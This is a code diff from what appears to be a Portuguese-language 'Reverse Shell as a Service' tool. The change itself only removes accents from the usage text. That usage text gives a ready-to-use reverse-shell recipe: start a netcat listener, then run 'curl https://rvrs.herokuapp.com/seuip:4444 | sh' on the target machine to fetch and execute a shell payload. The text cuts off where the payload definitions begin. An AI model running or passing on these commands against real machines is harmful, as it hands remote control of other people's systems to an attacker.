@@ -2,15 +2,15 @@
 
 const usage = `# Reverse Shell as a Service
 # Baseado do: https://github.com/lukechilds/reverse-shell
-# Código fonte em: https://github.com/afonso/rvrs
+# Codigo fonte em: https://github.com/afonso/rvrs
 #
-# 1. Na sua máquina:
+# 1. Na sua maquina:
 #      nc -l 4444
 #
-# 2. Na máquina alvo:
+# 2. Na maquina alvo:
 #      curl https://rvrs.herokuapp.com/seuip:4444 | sh
 #
-# 3. Não seja cuzão`;
+# 3. Nao seja cuzao`;
 
 const generateScript = (host, port) => {
 	const payloads = {
